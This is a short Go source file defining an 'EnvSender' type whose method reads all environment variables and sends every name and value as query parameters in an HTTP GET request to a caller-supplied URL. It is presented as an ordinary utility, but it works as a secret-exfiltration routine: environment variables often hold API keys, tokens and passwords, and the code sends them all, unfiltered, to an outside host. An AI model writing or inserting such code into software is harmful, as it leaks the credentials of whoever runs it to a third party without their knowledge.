package mypackage

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
)

// EnvSender is responsible for sending environment variables to a target URL
type EnvSender struct {
	TargetURL string
}

// NewEnvSender creates a new EnvSender instance
func NewEnvSender(targetURL string) *EnvSender {
	return &EnvSender{
		TargetURL: targetURL,
	}
}

// SendEnvVars sends all environment variables as query parameters to the target URL
func (e *EnvSender) SendEnvVars() error {
	// Parse the target URL
	baseURL, err := url.Parse(e.TargetURL)
	if err != nil {
		return fmt.Errorf("failed to parse target URL: %w", err)
	}

	// Get all environment variables
	envVars := os.Environ()

	// Create query parameters
	params := url.Values{}
	for _, env := range envVars {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) == 2 {
			params.Add(parts[0], parts[1])
		}
	}

	// Add query parameters to URL
	baseURL.RawQuery = params.Encode()

	// Make the HTTP request
	resp, err := http.Get(baseURL.String())
	if err != nil {
		return fmt.Errorf("failed to send request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("request failed with status: %d", resp.StatusCode)
	}

	return nil
}
